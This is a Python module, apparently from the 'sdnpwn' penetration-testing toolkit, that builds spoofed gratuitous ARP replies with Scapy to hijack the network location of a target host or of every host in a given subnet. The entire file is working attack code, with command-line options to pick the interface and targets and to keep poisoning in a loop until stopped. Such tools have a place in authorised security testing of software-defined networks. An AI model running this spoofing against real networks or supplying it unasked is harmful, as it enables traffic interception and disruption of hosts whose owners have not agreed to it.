from scapy.all import *
import sys
from time import sleep
import signal
from ipaddress import ip_network

try:
  import modules.sdnpwn.sdnpwn_common as sdnpwn
except:
  import sdnpwn_common as sdnpwn

def hijackHostLocation(iface, ip, vicMac):
  
  if(vicMac == ""):
    sdnpwn.message("Could not get MAC address for host " + ip, sdnpwn.ERROR)
    return False
  malARP = (Ether(src=vicMac, dst="FF:FF:FF:FF:FF:FF")/ARP(op=ARP.is_at, psrc=ip, hwsrc=vicMac, pdst=ip))
  sendp(malARP)
  
  return True

def haltAttack():
  global haltHijackHostLocation
  haltHijackHostLocation = True
  
def signal_handler(signal, frame):
  global haltHijackHostLocation
  print("")
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  haltAttack()
  
def info():
  return "Hijack the location of a network host by sending gratuitous ARP replies with a spoofed source MAC address."
  
def usage():
  
  sdnpwn.addUsage("--iface", "Interface to use", True)
  sdnpwn.addUsage("--target", "IP address of target host", True)
  sdnpwn.addUsage("--loop", "Continue poisoning until stopped")
  sdnpwn.addUsage("--delay", "Delay between packets when looping")
  
  return sdnpwn.getUsage()
  
def run(params):
  global haltHijackHostLocation
  haltHijackHostLocation = False
  
  signal.signal(signal.SIGINT, signal_handler)
  
  iface = ""
  target = ""
  loop = False
  loopDelay = 1
  
  if("--iface" in params):
    iface = params[params.index("--iface")+1]
  if("--target" in params):
    target = params[params.index("--target")+1]
  if("--loop" in params):
    loop = True
  if("--delay" in params):
    loopDelay = float(params[params.index("--delay")+1])
  
  targets = []
  
  if(target == ""):
    print(info())
    print(usage())
    return
  else:
    
    thisHostIP = sdnpwn.getIPAddress(iface)
    
    startIndex = 0
    endIndex = 1
    if("/" in target):
      targets = ip_network(target)
      startIndex = 1
      endIndex = targets.num_addresses-2
    else:
      targets = ip_network(str(target) + "/32")
      
    for host in range(startIndex, endIndex):
      targetHost = targets[host].exploded
      vicMac = sdnpwn.getTargetMacAddress(iface, targetHost)
      sdnpwn.message("Hijacking location of host  " + targetHost + " (" + vicMac + ")", sdnpwn.NORMAL)
      if(loop == True):
        while(haltHijackHostLocation is not True):
          hijackHostLocation(iface, thisHostIP, vicMac)
          sleep(loopDelay)
      else:
        hijackHostLocation(iface, thisHostIP, vicMac)
  
  
  
